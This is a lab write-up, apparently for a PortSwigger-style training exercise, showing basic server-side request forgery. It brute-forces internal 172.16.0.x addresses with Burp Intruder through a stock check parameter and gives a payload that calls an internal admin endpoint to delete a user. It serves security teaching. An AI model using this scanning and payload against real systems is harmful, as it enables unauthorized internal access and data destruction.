# Lab: Basic SSRF against another back-end system

## Description
This lab has a stock check feature which fetches data from an internal system. We need to find the IP address of an internal admin panel and use it to delete `carlos`.

## Analysis
The internal network is in the range `172.16.0.0/24`. The admin panel is running on port 8080 at one of these IP addresses.

## Exploitation
I need to brute-force the internal IP addresses.

### Steps
1. Intercept the stock check request.
2. Send the request to Burp Intruder.
3. Set the payload position on the last octet of the IP: `http://172.16.0.§1§:8080/admin`.
4. Set the payload type to "Numbers" from 1 to 255.
5. Start the attack. Look for a `200 OK` response.
6. Once the IP is found (e.g., `172.16.0.123`), use it to delete carlos:
   `http://172.16.0.123:8080/admin/delete?username=carlos`.

## Payload
```text
stockApi=http://172.16.0.x:8080/admin/delete?username=carlos
```

## Takeaways
- SSRF can be used to scan the internal network and identify hidden services.
- Intruder is a powerful tool for automating SSRF discovery.
